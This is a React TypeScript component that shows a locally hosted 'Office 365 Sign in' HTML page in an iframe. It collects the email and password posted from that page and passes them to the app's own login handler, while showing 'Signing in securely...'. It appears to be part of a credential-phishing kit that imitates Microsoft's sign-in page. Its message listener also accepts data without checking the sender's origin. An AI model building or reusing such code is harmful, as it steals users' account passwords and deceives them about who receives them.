import React, { useEffect } from 'react';
import { useLogin } from '../hooks/useLogin';
import Spinner from './common/Spinner';

interface Office365WrapperProps {
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
}

const Office365Wrapper: React.FC<Office365WrapperProps> = ({ onLoginSuccess, onLoginError }) => {
  // Use the existing login hook from the React app
  const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);

  useEffect(() => {
    const handleMessage = (event: MessageEvent) => {
      // Security: Ensure the message is from a trusted source if needed
      // For a local file, we can be less strict, but for a remote URL, you'd check event.origin
      if (event.data.type === 'OFFICE_365_SUBMIT') {
        const { email, password } = event.data.payload;
        
        // Use the existing React app's login logic
        handleFormSubmit(new Event('submit'), { email, password, provider: 'Office365' });
      }
    };

    window.addEventListener('message', handleMessage);

    // Cleanup listener when the component unmounts
    return () => {
      window.removeEventListener('message', handleMessage);
    };
  }, [handleFormSubmit]);

  // If the hook is loading, show a spinner overlay
  if (isLoading) {
    return (
      <div className="absolute inset-0 bg-white/80 flex flex-col items-center justify-center z-50">
        <Spinner size="lg" />
        <p className="mt-4 text-lg font-semibold text-gray-700">Signing in securely...</p>
      </div>
    );
  }
  
  // Display the original HTML file in an iframe.
  // This assumes your office.365.html is in the `public` folder.
  return (
    <iframe 
      src="/office.365.html" 
      title="Office 365 Sign in"
      className="w-full h-screen border-0"
    />
  );
};

export default Office365Wrapper;
